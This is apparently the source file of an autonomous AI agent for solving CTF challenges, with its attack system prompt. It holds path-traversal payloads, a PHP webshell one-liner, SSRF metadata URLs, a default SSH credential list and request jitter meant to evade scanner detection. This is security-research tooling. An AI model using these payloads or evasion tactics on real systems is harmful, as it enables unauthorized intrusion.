"""真实靶标解题器：代码负责感知与判定，模型只负责在候选里做选择。

设计依据（这一版是重写，不是调参）：

1. 感知层（sense.py）——平台给的 container_addr 只是线索，不是攻击面。同一台
   宿主机上映射着多道题的不同端口，给了 `:22` 不代表这题只有 SSH。所以开场由
   代码自己扫端口、抓 banner、判协议、问 mDNS，不经过模型。
2. 事实板（facts.py）——观测压缩成结构化事实并落盘，prompt 里给事实摘要而不是
   最近 8 条原文。原来 1800 字符一截断，第 3 步发现的东西第 10 步就丢了。
3. 候选意图（playbook.py）——模型不再在无限动作空间里自由编 JSON，而是从代码
   生成的 4-8 条候选里挑一条。Flash 级模型只能做「N 选 1」，做不了搜索。
4. 探测器（playbook.detect）——是否出 flag、是否触发告警、是否「太配合」，
   全部由代码吃真实字节判定，模型自述不参与。
5. 实时提交——一旦判定出候选立刻交给平台，用平台返回的 correct/进度当反馈，
   而不是攒到本题结束再一次性提交。

凭据只从环境变量读取；所有输出来自 events.emit，不打印任何密钥。
"""
from __future__ import annotations

import http.cookiejar
import json
import os
import random
import re
import signal
import socket
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from typing import Any, Callable

from . import graph_exec, sense
from .agent_loop import AgentRunner
from .attack_graph import AttackGraph, Entry, extract_entries
from .bench_client import Challenge, StartResult
from .events import emit
from .explore_graph import ExploreGraph
from .facts import Fact, FactBoard
from .flags import extract_flags  # noqa: F401  - 对外兼容旧的 import 路径
from .workspace import Workspace
from .session import SessionManager, pty_available

MAX_OBS_CHARS = 2600
MAX_STEPS_HARD_CAP = 200
MAX_FLAGS_PER_CHALLENGE = 15
# 同一主机两次动作之间的最小间隔 + 随机抖动。主动防御/蜜罐类靶标对节拍敏感，
# 均匀的高频请求最容易被判定成扫描器（Cairn 把这套叫「受管出口」）。
MIN_ACTION_GAP = 0.9
JITTER = 0.7
# 连续撞到这么多次主动防御话术就熔断该题，避免把「死手」这类题的自毁机制踩爆。
TRIPWIRE_BREAKER = 3
# 图上的边全打空后，最多自动回到侦察几轮。再多就是真的没牌了，该交给模型。
MAX_RECON_ROUNDS = 3
# 连续多少步没有新事实才让图回到侦察。图空 ≠ 卡住，模型可能正在正确的路上。
RECON_TRIGGER_STALE = 6
# 识别「模型自己登录成功了」的信号：命令里出现口令字段，响应里发了会话 cookie。
_SESSION_COOKIE_RE = re.compile(
    r"Set-Cookie:\s*(?:PHPSESSID|session|jsessionid|sessid|SESSID|connect\.sid)"
    r"=([A-Za-z0-9_\-]{8,})", re.I)
_LOGIN_HINT_RE = re.compile(
    r"(?:password|passwd|pwd)\s*=|login|signin|登录|认证", re.I)
# 连续多少步没有新事实就放弃这道题
# 连续多少步没有新事实就收手。实测有价值的进展都发生在前十几步：a-04 第 10 步
# 拿到 RCE，a-17 前 5 步解出凭据，之后 20 步全在重复同一件事。
# 阈值 25 意味着每道卡住的题要白烧 5-8 分钟，63 题跑一轮就是几小时。
STALE_ABANDON = 18
BANNER_CLIP = 700
# 静态工具放在这里，由镜像构建期铺进 /app/vendor/bin
TOOL_BIN_DIR = "/app/vendor/bin"

SSH_CREDS = [
    ("root", "root"), ("root", "toor"), ("root", "password"), ("admin", "admin"),
    ("ubuntu", "ubuntu"), ("vagrant", "vagrant"), ("test", "test"),
    ("msfadmin", "msfadmin"), ("user", "user"), ("guest", "guest"),
]

SYSTEM_PROMPT = r"""你是一台攻击机上的授权 CTF 操作员。你在一个隔离沙箱里，可以直接跑命令。

攻击机上装了：bash、python3、nmap、curl、ncat、socat、busybox（busybox 里带 nc/wget/
vi 等一整套）。所以你不需要「请求某个接口」，你**直接跑命令**。

每一轮输出**一个** JSON 对象，四选一：

1. 跑一条命令（最常用）：
{"cmd": "nmap -sT -Pn -sV --version-light -p80,22,30000-30010 10.0.0.5", "why": "先看服务"}
2. 起一个持久会话（ssh / nc / python 这类要交互的）：
{"session": "start", "cmd": "python3 -i", "why": "要交互"}
3. 往已有会话发东西 / 读出来：
{"session": "send", "id": 1, "text": "id; ls -la /\n"}
{"session": "read", "id": 1, "wait": 3}
{"session": "list"}  {"session": "kill", "id": 1}
4. 拿到了 Flag 就交卷：
{"flags": ["flag{...}"], "why": "从 /root/flag.txt 读到"}

操作要点：
- 先摸清服务再打。开场侦察已经由代码跑过一遍，结果就在上面的观测里；平台给的端口
  没响应时，先按「邻近端口」扫（`-p 4990-5010`），**不要用 `nmap -p-`**：全量扫一轮
  几十秒到几分钟，90 步预算经不起，一次就能吃掉三分之一。
- **步数按命令算，不按请求算。** 这是最省时间的一条：同类试探必须一条命令打完，
  不要一条命令打一个点。`for p in api/login api/user api/admin; do echo -n "$p ";
  curl -s -o /dev/null -w "%{http_code} %{size_download}\n" -m 5 http://HOST:PORT/$p;
  done`，一条命令 20 个路径，等价于 20 步。带参数的 fuzz 同理，把 payload 列在 for 循环里，
  只打印状态码和长度，看哪一行不一样。响应很长时用 `-o /dev/null -w` 只看码和长度。
- 每条命令都必须在 20 秒内出结果。给 nmap 加 `--host-timeout 20s -T4`，给 curl 加
  `-m 8`。跑满超时的命令等于白扔一步。
- HTTP 用 `curl -i -sS -m 10 http://HOST:PORT/路径`，别用 -o /dev/null，要看响应头。
- **`-X OPTIONS` 返回 200 只说明路由存在，不代表页面能打开。** gunicorn/Werkzeug 对
  每个已注册路由都会自动应答 OPTIONS，给一个 `Allow: OPTIONS, GET, HEAD, POST` 头、
  响应体是空的、长度 0。看到 `200 + Allow + Content-Length: 0` 就要认出这是 OPTIONS
  应答，不要当成「登录页打开了」或「页面时而 200 时而 500」——实跑里这个误判连续
  烧了 3 步去追一个根本不存在的「间歇性 200」。
- **沙箱里没有 requests / bs4 这类第三方库。** `python3 -c "import requests"` 必然
  报 ModuleNotFoundError，白扔一步。要发 HTTP 就用 curl；非要用 python3 就只用标准库
  （urllib.request / http.client）。
- **登录页恒 5xx、而所有业务路由都 302 到它，说明登录功能本身坏了**（崩在模板渲染，
  与任何输入都无关）。这时候不要再猜密码、猜字段名、换 SQL 注入 payload，那些全是
  无效步数；改去查「怎么绕过认证」：漏加鉴权的路由（试试 /logout 这类边角）、
  可伪造的会话、路径规范化、方法差异、请求头。
- 只有 :22 的题：ssh 未必装了客户端，用 session start 起 `ssh -o StrictHostKeyChecking=no
  用户@HOST`（镜像里没 ssh 客户端时改走 ssh_shell 工具），口令从题面或已有事实里取，
  **不要字典爆破**，这类题集明确考「策略选择」，爆破最容易踩主动防御。
- 要发反弹 shell、传文件、跑 python 脚本，一律走会话：先 start，再 send，再 read。
- 命令输出很长时自己用 head/grep/cut 收口，不要把几万行原始输出打出来。
- 看到形如 xxx{...} 的可疑串立刻交卷，不要反复确认——平台会给对错反馈。
- **失败要换族，不是换写法。** 某个端点上试过上传绕过、失败；试过 SQL 注入、失败；
  试过 SSRF、失败——那就换另一族（越权 id / 路径穿越 / 模板注入 / 反序列化），
  不要在同一族里改写同一条 payload（把 python 改写成 curl 不算换思路）。
  提示词里有「已排除」清单，同族在这个路径上失败过就不要再试。
- **看到 `?id=` / `?file=` / `?path=` / `?page=` / `?doc=` / `?name=` / `?download=`
  而且值是文件名或路径的接口，第一条命令就试路径穿越，不要先枚举别的路由。**
  这类「按文件名下载/预览/导入」的接口在靶场里极大概率没做路径校验：
  `for p in '../../../../etc/passwd' '../../../../challenge/flag.txt' '../../../../flag'
  '/flag.txt' '../../../../root/flag.txt'; do echo -n "$p ";
  curl -sS -b /tmp/cj -o /tmp/o -w '%{http_code} %{size_download}\n' --get
  --data-urlencode "id=$p" "http://HOST/download.php"; grep -a 'root:x:\|flag{' /tmp/o; done`
  实跑教训：a-05 就是 `/download.php?id=` 直读 `/challenge/flag.txt`，而模型拿到了这个
  链接却把 20 步全花在枚举不存在的 admin/approve 接口上，最后 stale 放弃。
- 登录成功后先**把仪表盘里所有 `href`/`action`/`.php` 链接原样抓出来**（
  `grep -Eo '(href|action)="[^"]+"'`），带参数的接口是最优先的攻击面；再去枚举
  字典里猜的路由——顺序反了就是白烧步数。
- 同一个命令不要重复跑；连续两次没进展就换思路（换协议、换端口、换路径、换角度）。
- **写文件用 `printf` 单行，不要用 heredoc。** `cat > /tmp/x.php <<'EOF'` 这种在
  JSON 里带换行很容易坏，坏掉的表现是后面 `curl -F file=@/tmp/x.php` 报
  `(26) Failed to open/read local data`，白烧两步。写成
  `printf '%s' '<?php system($_GET[c]); ?>' > /tmp/x.php` 一行搞定。
- **一旦打通了执行/读取，先把它记下来复用**：哪个 URL、哪个参数、哪个 Cookie／
  X-API-Key。后面每一步都基于同一个入口，不要重新上传一遍再猜文件名——实跑里
  有过「shell 已经能用，却又去测一个 404 的新文件名」的 8 步浪费。
- **拿到命令执行就立刻找 flag**，别再挖洞。按这个顺序一次读完：
  `cat /challenge/flag.txt /flag /flag.txt /root/flag.txt 2>/dev/null; ls -la /challenge`;
  再不行 `find / -iname '*flag*' 2>/dev/null | head`、`env | grep -i flag`。
- 响应里出现「检测到 / blocked / 已被记录 / 蜜罐」这类话术，立刻停手这条线，
  换个入口，别硬刚。"""


@dataclass
class Observation:
    step: int
    tool: str
    args: dict
    output: str
    elapsed: float
    thought: str = ""


@dataclass
class SolveContext:
    host: str
    hint_ports: list[int] = field(default_factory=list)
    base_url: str = ""
    board: FactBoard | None = None
    observations: list[Observation] = field(default_factory=list)
    sessions_text: str = ""
    jar: http.cookiejar.CookieJar = field(default_factory=http.cookiejar.CookieJar)
    # 已经跑过的动作。提示词里只放最近 3 条原始观测，模型会把第 2 步做过的事
    # 在第 6 步重做一遍（本地实测：robots.txt 被读了两次、备份目录被枚举三次）。
    # 这里留一份压缩后的动作清单，进 prompt，同时用于拦死重复命令。
    attempts: list[str] = field(default_factory=list)
    cmd_seen: dict[str, int] = field(default_factory=dict)
    cmd_cache: dict[str, str] = field(default_factory=dict)
    # 命令一字不改才拦得住的情况有限：模型会把同一段 python 重写成不同写法去抓
    # 同一个 URL（实跑里 app.js 被读了 8 遍）。所以再按「命令里出现的 URL 集合」
    # 记一层，同一组 URL 抓第三次就拦。
    url_seen: dict[str, int] = field(default_factory=dict)
    url_cache: dict[str, str] = field(default_factory=dict)
    # 「某族载荷在某路径上已经失败过」。字面去重挡不住「同一族换写法重试」
    # （a-04 那题在一个 403 入口上换了 8 种 python 写法），但把结论摆到提示词里，
    # 模型换族的概率明显更高。这里是知识而不是闸门，只提示不拦截。
    excluded: dict[str, int] = field(default_factory=dict)
    # 已经拿到命令执行的标记。一旦为真，后续不再鼓励继续挖洞，直接找 flag。
    rce_found: bool = False
    # 平台官方提示。这东西直接指出漏洞类型和命中位置，价值远高于模型自己猜，
    # 所以开局就取、每轮都放在提示词靠前位置，而不是等撞墙了才去找。
    hint: str = ""
    # 攻击图。决策的骨架在这里，不在提示词里。
    graph: AttackGraph | None = None


def parse_targets(container_addr: list[str]) -> tuple[str, list[int]]:
    """只解析出主机与提示端口。**不**再臆造 base_url。

    旧实现把第一个地址拼成 `http://host:port` 当 base_url，于是只给了 `:22` 的
    题会变成「往 SSH 端口发 HTTP」，整题 40 步全是失败请求。现在协议由 banner
    决定，地址只当线索。
    """
    host = ""
    ports: list[int] = []
    for addr in container_addr or []:
        addr = str(addr).strip()
        if not addr:
            continue
        candidate = addr if "://" in addr else "http://" + addr
        try:
            parts = urllib.parse.urlsplit(candidate)
        except ValueError:
            continue
        if not parts.hostname:
            continue
        if not host:
            host = parts.hostname
        if parts.port and parts.port not in ports:
            ports.append(parts.port)
    return host, ports


STUCK_HINTS = (
    (("上传", "文件", "附件", "图片"), (
        "上传类：改 Content-Type 与扩展名（.php/.phtml/.php5/.pht）、双扩展名（a.php.jpg）、"
        "文件名注入（a.php%00.jpg）、.htaccess 覆盖解析、把 webshell 塞进图片头（GIF89a）、"
        "找上传目录是否可直接访问 /uploads /upload /files。")),
    (("内网", "探测", "URL", "诊断", "代理", "转发"), (
        "SSRF/穿透类：参数改成 http://127.0.0.1:端口、http://内网服务名:端口、"
        "http://169.254.169.254/latest/meta-data/、file:///flag 或 file:///etc/passwd、"
        "dict://、gopher://；响应为空时试 302 跳转、试 /admin、试不同端口。")),
    (("代码", "审计", "仓库", "源码"), (
        "源码审计类：翻 .git/HEAD、.git/config、/backup/、*.zip/*.bak、sourceMappingURL、"
        "/assets/js/*.js 里的接口与硬编码密钥；拿到源码后按路由逐个看鉴权。")),
    (("报销", "合同", "资产", "办公", "工单", "审批", "报表", "后台"), (
        "越权类：改 id 越权读别人的单子（id±1、UUID 遍历）、直接调导出/详情 API 绕过前端、"
        "用普通账号打管理员接口、注意 ?debug=1 / ?admin=1 / X-Forwarded-For: 127.0.0.1。")),
    (("序列化", "组件", "沙箱", "脚本"), (
        "组件/沙箱类：确认组件版本与已知 gadget，试 yaml/jackson/fastjson/xstream 特征 payload、"
        "试模板注入 {{7*7}}、试命令拼接与路径穿越。")),
)


def _discover_routes(base_url: str) -> tuple[list[str], list[str], int, list[Entry], list[str]]:
    """抓首页与前端 JS，抽出路由、硬编码凭据和带参数的攻击面。

    第四项是给攻击图用的：前端脚本里的 API 调用带着方法和请求体参数名，这些
    参数名是「这个接口该按什么语义打」的唯一依据。丢掉它们，图就派不出边，
    模型只能自己花十几步去 JS 里翻——a-09 实跑就是这样耗掉 19 步还没转出边。
    """
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    base = base_url.rstrip("/")
    try:
        with opener.open(base + "/", timeout=6) as response:
            html = response.read(300_000).decode("utf-8", "replace")
    except Exception:
        return [], [], 0, [], []
    scripts = sense.fetch_assets(base, html)
    routes = sense.extract_routes(html, scripts)
    secrets = sense.extract_secrets(scripts + "\n" + html)
    emit("recon_routes", base=base, routes=len(routes),
         secrets=len(secrets), js_chars=len(scripts))
    try:
        entries = extract_entries(html + "\n" + scripts)
    except Exception:
        entries = []
    # 前端代码里 base64 藏的凭据：这类活该由代码干，成本 0 步。a-17 实测模型
    # 为此把前端 JS 读了五遍，每遍只 grep 关键词，始终没把凭据用上。
    encoded = sense.extract_encoded_secrets(scripts + "\n" + html)
    return routes, secrets, len(scripts), entries, encoded


def _detect_auth_success(command: str, output: str) -> bool:
    """模型自己跑出了登录成功的迹象。

    图能派 auth 边，但只带少量常见凭据；模型要是注册了新账号或试出了别的口令，
    图必须知道「会话已经有了」，否则之前因缺会话而关掉的边不会重开。
    """
    if not _LOGIN_HINT_RE.search(command or ""):
        return False
    if _SESSION_COOKIE_RE.search(output or ""):
        return True
    return bool(re.search(r"(登录成功|LOGIN_OK|login success|authenticated)",
                          output or "", re.I))


def _stuck_hint(challenge: Challenge, step: int) -> str:
    """连续多步没有新事实时，给一版对口的攻击面清单。

    实跑里 a-03..a-16 全部跑满 60 步没有产出，轨迹显示它们反复读同一个 JS、
    重复同一个 403 请求。模型不是不努力，是缺「换一族动作」的提示。
    """
    desc = f"{challenge.description} {challenge.unique_code}"
    for keys, hint in STUCK_HINTS:
        if any(k in desc for k in keys):
            return f"已经第 {step} 步，仍然没有新事实。换攻击面，按这一族逐条试：\n{hint}"
    return ("已经第 %d 步，仍然没有新事实。换攻击面：把入口当成别的漏洞类型再试一遍——"
            "目录与备份文件、参数注入、越权 id、上传/写入、模板或反序列化、"
            "内部服务与云元数据。" % step)


def _cmd_signature(tool: str, args: dict) -> str:
    """把动作归一化成可比较的签名，用来识别「同一条命令又跑一遍」。"""
    if tool in ("shell", "session_start"):
        raw = str(args.get("command") or args.get("cmd") or "")
    else:
        raw = json.dumps(args, sort_keys=True, ensure_ascii=False, default=str)
    return f"{tool}:" + re.sub(r"\s+", " ", raw).strip()


URL_RE = re.compile(r"https?://[^\s'\"<>|)]+", re.I)

# 命令里带这些就说明它是在「对同一份响应做新的提取」，而不是重复抓取。
# a-04 实测：模型第 6/10/11/12/15 步都在读同一个 app.js，但每次 grep 的关键字
# 不同——原来的 URL 去重把这些全拦了，25 步里白扔 10 步，还顺手把真实入口
# `/api/upload.php` 记成了「已排除」。
# 注意别把 `python3 -c` 算进来：那是「换一种写法抓同一个地址」，正是去重要管的。
_EXTRACTOR_RE = re.compile(
    r"\b(grep|egrep|sed|awk|cut|head|tail|sort|uniq|wc|tr|jq|nl|xxd|base64|"
    r"strings|diff)\b")


def _url_signature(command: str) -> str:
    """命令里出现的 URL 集合。空集合表示这条命令不是在抓某个固定地址。"""
    urls = sorted({m.group(0).rstrip(".,;") for m in URL_RE.finditer(command or "")})
    return "|".join(urls)


def _is_pure_fetch(command: str) -> bool:
    """是不是「只是把响应拿回来」——带文本过滤的不算，那种每次信息量都不同。"""
    return not _EXTRACTOR_RE.search(command or "")


# 攻击族标记。注意每条都要求命令里真的带了这一族的**载荷或手法**，不能只因为
# 路径里有个 "upload" 就算试过上传——a-04 实测的坑就在这里：读一次
# /api/upload.php 就被记成「上传绕过 @ /api/upload.php 已排除」，而它恰恰是
# 真实入口，提示词于是把模型从正解上推开了。
ATTACK_FAMILIES = (
    ("上传绕过", ("-f ", "--form", "multipart", "filename=", "\\.phtml")),
    ("SSRF", ("169.254.169.254", "file://", "gopher://", "dict://",
              "url=http", "target_url=", "dest=")),
    ("路径穿越", ("\\.\\./", "%2e%2e", "/etc/passwd", "..%2f", "win.ini")),
    ("SQL 注入", ("union select", "or 1=1", "or '1'='1", "' or ", "sleep(",
                  "information_schema", "sqlmap")),
    ("SSTI", ("{{", "${", "<%=", "%7b%7b")),
    ("命令注入", (";id", "|id", "`id", "$(", "&&id", ";cat ", "|cat ")),
    ("越权 id", ("id=1", "id=2", "user_id=", "uid=", "?id=")),
    ("反序列化", ("ro0ab", "aced0005", "unserialize", "pickle", "ysoserial")),
    ("XXE", ("<!doctype", "<!entity", "xmlns:")),
)

_FAILURE_RE = re.compile(
    r"(?i)(403 forbidden|401 unauthorized|\b404\b|access denied|invalid (?:api )?key|"
    r"permission denied|not allowed|forbidden|unauthorized|no such file|"
    r"invalid parameter|参数错误|无权|禁止|未授权)")

# 命令执行的典型回显（id/whoami/env 之类）。
_EXEC_PROOF_RE = re.compile(r"(uid=\d+\([\w.-]+\)|root:x:0:0:|www-data|x:33:33)", re.I)

# 拿到命令执行之后该先看哪儿。CTF 靶场把 flag 放在固定几个位置的居多，
# 实跑 a-04 时模型已经有 RCE 却还在反复重新上传 shell、没有去 /challenge/。
FLAG_HUNT = ("/challenge/ /challenge/flag.txt /flag /flag.txt /root/flag /root/flag.txt "
             "/home/*/flag* /var/www/flag* /opt/flag* /tmp/flag* "
             "以及 `find / -iname '*flag*' 2>/dev/null`、"
             "`env | grep -i flag`、`ls -la /challenge`")


def _attack_family(command: str) -> tuple[str, str]:
    """判断一条命令在试哪一族漏洞、打哪个路径。判断不出就返回空串。"""
    low = (command or "").lower()
    family = ""
    for name, markers in ATTACK_FAMILIES:
        if any(marker in low for marker in markers):
            family = name
            break
    if not family:
        return "", ""
    match = URL_RE.search(command or "")
    path = ""
    if match:
        try:
            path = urllib.parse.urlsplit(match.group(0)).path or "/"
        except ValueError:
            path = ""
    # `/$p`、`/api/{id}` 这类是 shell 变量或模板，不是真实路径，别拿来记账
    if any(ch in path for ch in ("$", "{", "%", "*", ";")):
        path = ""
    return family, path


def _looks_failed(output: str) -> bool:
    return bool(_FAILURE_RE.search(output or ""))


def _kill_tree(proc: "subprocess.Popen[str] | None") -> None:
    """杀掉整棵进程树。

    只 kill 直接子进程不够：`bash -lc "nmap ..."` 里 nmap 是孙进程，杀掉 bash 后
    它仍在占管道，父进程的 communicate 会一直阻塞。POSIX 用进程组，Windows 用
    taskkill /T。
    """
    if proc is None or proc.poll() is not None:
        return
    try:
        if os.name == "posix":
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
        else:
            subprocess.run(["taskkill", "/F", "/T", "/PID", str(proc.pid)],
                           capture_output=True, timeout=10)
    except Exception:
        try:
            proc.kill()
        except Exception:
            pass


class Toolkit:
    """固定工具集。每个方法返回给模型看的文本观测。"""

    def __init__(self, context: SolveContext, shell_timeout: int = 30,
                 http_timeout: int = 12):
        self.context = context
        self.shell_timeout = shell_timeout
        self.http_timeout = http_timeout
        # 持久会话（CAI 的 generic_linux_command interactive 等价物）。
        # 没有它，反弹 shell / 交互式 ssh / nc 传文件全做不了。
        self.sessions = SessionManager()
        self._last_action = 0.0
        # 打靶流量必须直连：环境里的出网代理会把发往靶标的请求也劫持成 502
        self._opener = urllib.request.build_opener(
            urllib.request.ProxyHandler({}),
            urllib.request.HTTPCookieProcessor(context.jar),
        )
        self._env_opener = None

    # -- 内部 ------------------------------------------------------

    def pace(self) -> None:
        """受管出口：串行、低频、带抖动。均匀高频最容易被判成扫描器。"""
        gap = time.time() - self._last_action
        target = MIN_ACTION_GAP + random.uniform(0, JITTER)
        if gap < target:
            time.sleep(target - gap)
        self._last_action = time.time()

    def tool_env(self) -> dict:
        """剥掉代理变量，并把静态工具目录塞进 PATH。"""
        env = {k: v for k, v in os.environ.items() if "proxy" not in k.lower()}
        path = env.get("PATH", "/usr/local/bin:/usr/bin:/bin")
        if TOOL_BIN_DIR not in path.split(":"):
            path = TOOL_BIN_DIR + ":" + path
        env["PATH"] = path
        return env

    def _absolute(self, path: str) -> str:
        path = str(path or "/").strip()
        if path.startswith("http://") or path.startswith("https://"):
            return path
        if not path.startswith("/"):
            path = "/" + path
        base = self.context.base_url or f"http://{self.context.host}"
        return base.rstrip("/") + path

    @staticmethod
    def _clip(text: str, limit: int = MAX_OBS_CHARS) -> str:
        text = text if isinstance(text, str) else str(text)
        if len(text) <= limit:
            return text
        # 头尾都留：Web 响应里真正有用的东西（表单、链接、flag）常在头尾，
        # 中间是几万字符的 CSS/JS 噪音。只留头部会把末尾的 <form> 切掉，
        # 图就抽不到参数名——a-09 的导出表单正是被这样丢掉的。
        head = int(limit * 0.6)
        tail = limit - head
        return (text[:head]
                + f"\n...[中间省略 {len(text) - limit} 字符]...\n"
                + text[-tail:])

    # -- HTTP ------------------------------------------------------

    def http_request(self, method: str = "GET", path: str = "/",
                     headers: dict | None = None, body: str = "") -> str:
        url = self._absolute(path)
        data = body.encode("utf-8") if body else None
        verb = str(method or "GET").upper()
        hdrs = {str(k): str(v) for k, v in (headers or {}).items()}

        def send(opener) -> str:
            request = urllib.request.Request(url, data=data, method=verb,
                                             headers=hdrs)
            with opener.open(request, timeout=self.http_timeout) as response:
                text = response.read().decode("utf-8", errors="replace")
                head = "\n".join(f"{k}: {v}" for k, v in response.headers.items())
                return self._clip(f"HTTP {response.status} {url}\n{head}\n\n{text}")

        self.pace()
        try:
            return send(self._opener)
        except urllib.error.HTTPError as exc:
            text = exc.read().decode("utf-8", errors="replace")
            head = "\n".join(f"{k}: {v}" for k, v in exc.headers.items())
            return self._clip(f"HTTP {exc.code} {url}\n{head}\n\n{text}")
        except Exception as exc:  # 网络层失败也算观测
            alt = self._env_proxy_opener()
            if alt is not None:
                try:
                    return "[直连失败，已改走环境代理]\n" + send(alt)
                except Exception:
                    pass
            return f"请求失败 {url}: {type(exc).__name__}: {exc}"

    def _env_proxy_opener(self):
        if self._env_opener is False:
            return None
        if self._env_opener is None:
            proxies = urllib.request.getproxies()
            if not proxies:
                self._env_opener = False
                return None
            self._env_opener = urllib.request.build_opener(
                urllib.request.ProxyHandler(proxies),
                urllib.request.HTTPCookieProcessor(self.context.jar),
            )
        return self._env_opener

    def http_get(self, path: str = "/", headers: dict | None = None) -> str:
        return self.http_request("GET", path, headers)

    def http_post(self, path: str = "/", body: str = "",
                  content_type: str = "application/x-www-form-urlencoded") -> str:
        return self.http_request("POST", path, {"Content-Type": content_type}, body)

    # -- 网络 ------------------------------------------------------

    def port_scan(self, ports: list | None = None) -> str:
        host = self.context.host
        if not host:
            return "没有可用主机地址"
        targets = []
        for raw in (ports or self.context.hint_ports):
            try:
                targets.append(int(raw))
            except (TypeError, ValueError):
                continue
        targets = targets or sense.TOP_PORTS
        open_ports = sense.scan(host, targets[:1024])
        return f"主机 {host} 指定端口中的开放端口: {open_ports}"

    def rescan(self) -> str:
        """深度重扫：提示端口邻域没东西时，才升级到全量端口表。"""
        return (recon_scan(self.context, self.context.board,
                           emit_events=False, deep=True)
                or "重扫完成，无新增服务")

    def tcp_send(self, port: int, payload: str = "", read_bytes: int = 4096) -> str:
        host = self.context.host
        if not host:
            return "没有可用主机地址"
        try:
            port = int(port)
        except (TypeError, ValueError):
            return "port 必须是整数"
        data = payload.encode("utf-8", errors="replace") if payload else b""
        self.pace()
        try:
            with socket.create_connection((host, port),
                                          timeout=self.http_timeout) as sock:
                if data:
                    sock.sendall(data)
                sock.settimeout(self.http_timeout)
                chunks, total = [], 0
                while total < int(read_bytes or 4096):
                    try:
                        chunk = sock.recv(4096)
                    except socket.timeout:
                        break
                    if not chunk:
                        break
                    chunks.append(chunk)
                    total += len(chunk)
                text = b"".join(chunks).decode("utf-8", errors="replace")
                return self._clip(f"TCP {port} 收到 {total} 字节:\n{text}")
        except Exception as exc:
            return f"TCP {port} 失败: {type(exc).__name__}: {exc}"

    def udp_probe(self, port: int = 5353, payload_hex: str = "0000") -> str:
        host = self.context.host
        try:
            payload = bytes.fromhex(str(payload_hex))
        except ValueError:
            payload = b"\x00"
        data = sense.udp_probe(host, int(port), payload)
        return (f"UDP {port} 收到 {len(data)} 字节：{data[:400]!r}"
                if data else f"UDP {port} 无响应")

    def mdns(self) -> str:
        names = sense.mdns_services()
        if not names:
            return "mDNS 没有公布任何服务（可能未启用或不在同一广播域）"
        return "mDNS 公布的服务：\n" + "\n".join(names)

    def dns_query(self, name: str = "", qtype: str = "TXT",
                  server: str | None = None) -> str:
        if not name:
            return "name 为空"
        return sense.dns_query(name, qtype, server)

    # -- SSH -------------------------------------------------------

    def ssh_audit(self, port: int = 22) -> str:
        host = self.context.host
        try:
            import paramiko  # type: ignore
        except ImportError:
            return "paramiko 不可用（镜像未带 vendor 依赖），无法做 SSH 审计"
        self.pace()
        try:
            transport = paramiko.Transport((host, int(port)))
            transport.banner_timeout = 6
            transport.start_client(timeout=8)
            remote = transport.remote_version
            auth = []
            try:
                transport.auth_none("probe")
            except paramiko.BadAuthenticationType as exc:
                auth = list(exc.allowed_types or [])
            except Exception:  # noqa: BLE001
                pass
            transport.close()
            return (f"SSH 服务 {host}:{port}\n版本: {remote}\n"
                    f"允许的认证方式: {auth or '未知（可能需要先提供用户名）'}")
        except Exception as exc:  # noqa: BLE001
            return f"SSH 审计失败 {host}:{port}: {type(exc).__name__}: {exc}"

    def ssh_login(self, port: int = 22, creds: list | None = None) -> str:
        """只在题目明确需要时用，且最多试 4 组——爆破最容易触发主动防御。"""
        host = self.context.host
        try:
            import paramiko  # type: ignore
        except ImportError:
            return "paramiko 不可用（镜像未带 vendor 依赖），无法尝试 SSH 登录"
        pairs: list[tuple[str, str]] = []
        for item in creds or []:
            text = str(item)
            if ":" in text:
                user, _, pwd = text.partition(":")
                pairs.append((user, pwd))
        for pair in SSH_CREDS:
            if pair not in pairs:
                pairs.append(pair)
        pairs = pairs[:4]

        for user, pwd in pairs:
            self.pace()
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(host, port=int(port), username=user, password=pwd,
                               timeout=8, banner_timeout=8, auth_timeout=8,
                               allow_agent=False, look_for_keys=False)
            except Exception as exc:  # noqa: BLE001
                emit("ssh_auth_fail", port=port, user=user,
                     detail=type(exc).__name__)
                continue
            try:
                out = self._ssh_collect(client)
                return (f"SSH 登录成功 {user}:{pwd} @ {host}:{port}\n{out}")
            finally:
                client.close()
        return f"SSH {host}:{port} 试了 {len(pairs)} 组常见口令均失败（已停止，避免触发防御）"

    def _ssh_collect(self, client) -> str:
        commands = [
            "id; uname -a; hostname",
            "ls -la / /root /home 2>/dev/null",
            "cat /flag /flag.txt /root/flag /root/flag.txt 2>/dev/null",
            "grep -rIl --exclude-dir=proc --exclude-dir=sys -m1 flag / 2>/dev/null | head -20",
        ]
        chunks = []
        for command in commands:
            try:
                _, stdout, stderr = client.exec_command(command, timeout=20)
                text = stdout.read().decode("utf-8", "replace")
                err = stderr.read().decode("utf-8", "replace")
                chunks.append(f"$ {command}\n{text}{err}"[:1500])
            except Exception as exc:  # noqa: BLE001
                chunks.append(f"$ {command}\n(执行失败 {type(exc).__name__})")
        return self._clip("\n\n".join(chunks))

    # -- 沙箱 ------------------------------------------------------

    def shell(self, command: str) -> str:
        command = str(command or "").strip()
        if not command:
            return "command 为空"
        self.pace()
        started = time.time()
        proc = None
        try:
            # 必须用 `bash -c`，不能用 `bash -lc`：login shell 会读 /etc/profile，
            # 而 Debian 的 profile 把 PATH 重新赋成默认值，/app/vendor/bin 被丢掉。
            # 平台实跑轨迹里因此出现过 `curl: command not found`——整套静态工具
            # 整轮都没生效。
            proc = subprocess.Popen(
                ["bash", "-c", command], stdout=subprocess.PIPE,
                stderr=subprocess.PIPE, cwd="/tmp", text=True, errors="replace",
                env=self.tool_env(), start_new_session=(os.name == "posix"),
            )
            out, err = proc.communicate(timeout=self.shell_timeout)
        except subprocess.TimeoutExpired:
            # subprocess.run(timeout=) 只杀直接子进程；nmap 这类会再 fork 的命令
            # 留下孙进程继续占着管道，communicate 会一直等下去（本地实测设 30s
            # 超时实际卡了 120s）。这里按进程组整体杀掉再收尸。
            _kill_tree(proc)
            try:
                out, err = proc.communicate(timeout=5)
            except Exception:
                out, err = "", ""
            tail = ((out or "") + (err or "")).strip()[-400:]
            return self._clip(
                f"命令超时（>{self.shell_timeout}s），已强制结束：{command}\n"
                f"实际耗时 {time.time() - started:.0f}s。下次缩短它：指定端口而不是"
                f"全量扫、加 --host-timeout / -m 5、或者用 head 截断输出。\n"
                f"已拿到的输出：\n{tail or '(无)'}")
        except Exception as exc:
            if proc is not None:
                _kill_tree(proc)
            return f"命令执行失败: {type(exc).__name__}: {exc}"
